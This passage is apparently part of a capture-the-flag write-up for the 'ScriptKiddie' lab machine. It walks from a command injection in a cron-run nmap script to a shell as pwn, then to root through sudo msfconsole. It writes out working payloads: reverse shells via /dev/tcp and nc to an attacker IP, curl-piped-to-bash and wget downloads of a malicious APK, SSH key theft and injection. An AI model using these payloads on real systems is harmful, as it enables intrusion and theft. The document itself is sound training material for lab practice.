drwxr-xr-x  4 root root 4096 Feb  3 07:40 ..
lrwxrwxrwx  1 root kid     9 Jan  5 20:31 .bash_history -> /dev/null
-rw-r--r--  1 kid  kid   220 Feb 25  2020 .bash_logout
-rw-r--r--  1 kid  kid  3771 Feb 25  2020 .bashrc
drwxrwxr-x  3 kid  kid  4096 Feb  3 07:40 .bundle
drwx------  2 kid  kid  4096 Feb  3 07:40 .cache
drwx------  4 kid  kid  4096 Feb  3 11:49 .gnupg
drwxrwxr-x  3 kid  kid  4096 Feb  3 07:40 .local
drwxr-xr-x  9 kid  kid  4096 Feb  3 07:40 .msf4
-rw-r--r--  1 kid  kid   807 Feb 25  2020 .profile
drwx------  2 kid  kid  4096 Feb 10 16:11 .ssh
-rw-r--r--  1 kid  kid     0 Jan  5 11:10 .sudo_as_admin_successful
drwxrwxr-x  5 kid  kid  4096 Jun 12 13:39 html
drwxrwxrwx  2 kid  kid  4096 Feb  3 07:40 logs
drwxr-xr-x  3 kid  kid  4096 Feb  3 11:48 snap
-r--------  1 kid  kid    33 Jun 12 11:49 user.txt
$ cd logs
$ ls -la
total 8
drwxrwxrwx  2 kid kid 4096 Feb  3 07:40 .
drwxr-xr-x 11 kid kid 4096 Feb  3 11:49 ..
-rw-rw-r--  1 kid pwn    0 Jun 12 12:43 hackers
```

There was a `logs` directory, with a `hackers` file owned by the `pwn`user, which was empty.

I wondered if trying to 'hack' the site updated the file:

![](/assets/images/blogs/Pasted image 20210612144729.png)

It didn't seem to change.

I checked `/etc/passwd` for other users:

```bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
kid:x:1000:1000:kid:/home/kid:/bin/bash
pwn:x:1001:1001::/home/pwn:/bin/bash
```

The only other 'real' user was `pwn`.

I looked for files owned by `kid`:

```bash
$ find / -user kid 2>/dev/null
...[proc]...
/home/kid/.ssh
/home/kid/.ssh/authorized_keys
/home/kid/user.txt
/home/kid/logs
/home/kid/logs/hackers
/tmp/hsperfdata_kid
/tmp/hellothere.sh
/tmp/tmpxd8fhlry.apk
...[var]...
```

And for files in our group:

```bash
$ find / -group kid 2>/dev/null | grep -Ev 'proc|var|sys|run|cache|snap|gnupg'
/home/kid
/home/kid/.bash_logout
/home/kid/.local
/home/kid/.local/share
/home/kid/.local/share/apktool
/home/kid/.local/share/apktool/framework
/home/kid/.local/share/apktool/framework/1.apk
/home/kid/.bashrc
/home/kid/.sudo_as_admin_successful
/home/kid/html
/home/kid/html/app.py
/home/kid/html/static
/home/kid/html/static/hacker.css
/home/kid/html/static/payloads
/home/kid/html/static/payloads/2a8c154d3f36.exe
/home/kid/html/hackers
/home/kid/html/templates
/home/kid/html/templates/index.html
/home/kid/.bash_history
/home/kid/.profile
/home/kid/.msf4
/home/kid/.msf4/local
/home/kid/.msf4/logos
/home/kid/.msf4/store
/home/kid/.msf4/store/modules_metadata.json
/home/kid/.msf4/loot
/home/kid/.msf4/plugins
/home/kid/.msf4/modules
/home/kid/.msf4/logs
/home/kid/.msf4/logs/sessions
/home/kid/.msf4/logs/production.log
/home/kid/.msf4/logs/framework.log
/home/kid/.bundle
/home/kid/.ssh
/home/kid/.ssh/authorized_keys
/home/kid/user.txt
/home/kid/logs
/home/kid/logs/hackers
/tmp/hsperfdata_kid
/tmp/lkyv
/tmp/lkwi
/tmp/wqin
/tmp/brzwl
```

And for files owned by `pwn`:

```bash
$ find / -user pwn 2>/dev/null
/home/pwn
/home/pwn/recon
/home/pwn/.bash_logout
/home/pwn/.local
/home/pwn/.local/share
/home/pwn/.selected_editor
/home/pwn/.bashrc
/home/pwn/.cache
/home/pwn/.profile
/home/pwn/.ssh
/home/pwn/scanlosers.sh
```

`/home/pwn/scanlosers.sh` looks interesting. Let's see what's inside.

## Scanlosers.sh Command Injection

```bash
$ cat /home/pwn/scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [ $(wc -l < $log) -gt 0 ](#-$(wc--l-<-$log)--gt-0-); then echo -n > $log; fi
```

It looks like it takes whatever IPs are in the `hackers` file and runs `nmap` against them, then wipes the file. We can see if we can catch this behaviour in `pspy`:

```bash
$ cd /tmp
$ wget http://10.10.16.211:8000/pspy64
--2021-06-12 14:01:38--  http://10.10.16.211:8000/pspy64
Connecting to 10.10.16.211:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.94M  1.27MB/s    in 2.3s    

2021-06-12 14:01:40 (1.27 MB/s) - ‘pspy64’ saved [3078592/3078592]

$ chmod +x pspy64
$ ./pspy64
```

Sure enough, when we submit `;id` to the searchsploit field we see our IP being scanned:

![](/assets/images/blogs/Pasted image 20210612145609.png)

We can also see some sort of other CRON-based automation, running as root. We can read `/etc/crontab` to see this:

```bash
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

So, it looks like some sort of automation is reading the hackers file. If we insert a malicious 'ip address' into the file, it will be read by `pwn` and executed as part of the `nmap` command.

However, the script cuts based on spaces. So we can try to insert a payload that doesn't have spaces, using the $IFS character:

```bash
;/bin/bash$IFS-c$IFS'bash$IFS-i$IFS>&$IFS/dev/tcp/10.10.16.211/9001$IFS0>&1'#
```

This should end the `nmap` command with a semicolon, execute our command, then comment the rest out.

Echoing it to the file, however, gives us no results:

```
kid@scriptkiddie:~/logs$ echo ";/bin/bash$IFS-c$IFS'bash$IFS-i$IFS>&$IFS/dev/tcp/10.10.16.211/9001$IFS0>&1'#" >> hackers
```

I wondered if it was getting cleared extremely quickly after being written, so I tried to both echo to it and submit `;id` to trigger the scanning at the same time:

![](/assets/images/blogs/Pasted image 20210612151527.png)

We can see the scan on our IP, but not our malicious payload.

I tried editing the file just to make sure I had permissions. This time, the edit showed up in the log:

![](/assets/images/blogs/Pasted image 20210612151628.png)

So it looks like writing with `nano` works. Cool!

Now we just need to add our real payload:

![](/assets/images/blogs/Pasted image 20210612151702.png)

This time we see the injected code:

![](/assets/images/blogs/Pasted image 20210612151738.png)

But the shell immediately dies, just like before!

![](/assets/images/blogs/Pasted image 20210612151801.png)

So... why not reuse the payload that eventually worked?

```bash
curl http://10.10.16.211/rev.sh | bash
```

This payload becomes:

```bash
;curl$IFShttp://10.10.16.211/rev.sh$IFS|$IFSbash#
```

Sending it off, we see the injection but no code execution:

![](/assets/images/blogs/Pasted image 20210612152324.png)

And no hit on our python server:

![](/assets/images/blogs/Pasted image 20210612153059.png)

So I added the `/bin/bash -c` prefix:

```bash
;/bin/bash$IFS-c$IFS'curl$IFShttp://10.10.16.211/rev.sh$IFS|$IFSbash'#
```

However, I didn't get anything back. It seems to delete the single quotes from the payload, which may be breaking the command:

![](/assets/images/blogs/Pasted image 20210612152841.png)

I tried a few payloads here, including with both `$IFS` and `${IFS}`:
- `;echo$IFS"bash${IFS}-i${IFS}>&${IFS}/dev/tcp/10.10.16.211/9001${IFS}0>&1"$IFS>$IFS/home/pwn/rev;$IFS/home/pwn/rev#` to create and execute a staged payload
- `;cp${IFS}/home/pwn/.ssh/id_rsa${IFS}/home/pwn/;${IFS}chmod${IFS}777${IFS}/home/pwn/id_rsa#` to copy `pwn`'s SSH key and make it readable
- `;echo${IFS}"ssh-rsa${IFS}AA...[snip]...38="${IFS}>${IFS}/home/pwn/.ssh/authorized_keys#` to write an SSH key

But none worked.

### Working Payload with APK

Eventually, I had the idea to reuse the exploit from before, and manually execute a malicious APK!

I copied across the APK that excecutes the reverse shell using `curl`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/www]
└─$ cp /tmp/tmp056ul9j3/evil.apk .
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/www]
└─$ mv evil.apk exec-rev.apk
```

Then I started a python server to serve up both `exec-rev.apk` and `rev.sh` on port 80, and executed the command to download the apk:

```bash
;wget${IFS}http://10.10.16.211/exec-rev.apk#
```

![](/assets/images/blogs/Pasted image 20210612160656.png)

This hit my server (twice, strangely):

![](/assets/images/blogs/Pasted image 20210612160716.png)

Then I had to make it execute the malicious apk. I used this command:

```bash
;msfvenom${IFS}-x${IFS}/home/pwn/exec-rev.apk${IFS}-p${IFS}android/meterpreter/reverse_tcp${IFS}LHOST=127.0.0.1${IFS}LPORT=4444${IFS}-o${IFS}/dev/null#
```

(I used `find` to get the path):

```bash
kid@scriptkiddie:~/logs$ find / -name "exec-rev.apk" 2>/dev/null
/home/pwn/exec-rev.apk
```

It executed:

![](/assets/images/blogs/Pasted image 20210612161536.png)

And gave me a shell as `pwn`!

![](/assets/images/blogs/Pasted image 20210612161610.png)

# Shell as pwn -> Root

The first things I checked were my groups and sudo permissions:

```bash
pwn@scriptkiddie:~$ id
id
uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

What do you know? In very on-brand fashion, we can run metasploit as root!

We *could* use this to run the apk exploit as root, but that's no fun - we've already used it twice.

Instead, we can use metasploit's in built shell to run commands. I ran `sudo msfconsole -q` (`-q` flag being optional) and then just typed `/bin/bash` to get a root shell :)

![](/assets/images/blogs/Pasted image 20210612161953.png)

That's the box!

## Notes on Alternative Methods

An easier way of 'bypassing' the `cut` command (courtesy of ippsec) was just to match the correct format of the log file, by inserting three rows of arbitrary data before the command:

```bash
kid@scriptkiddie:~/logs$ echo 'whatever whatever ;/bin/bash -c "bash -i >& /dev/tcp/10.10.16.211/9001 0>&1"' >> hackers
```

This gives us another unstable shell that immediately dies:

![](/assets/images/blogs/Pasted image 20210612163258.png)

A nice alternative payload (courtesy of a colleague) would have been:

```bash
kid@scriptkiddie:~/logs$ echo 'whatever whatever ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.211 9001 >/tmp/f' >> hackers
```

This gives us a shell that doesn't immediately die - but it doesn't send any commands either.

![](/assets/images/blogs/Pasted image 20210612163616.png)

![](/assets/images/blogs/Pasted image 20210612163639.png)

I'd be interested to see if there was a good way to get a stable shell this way. I'd also be interested to see if there was a good way of exploiting the command injection in the `searchsploit` field that partially worked early on, but I couldn't get it to work myself.

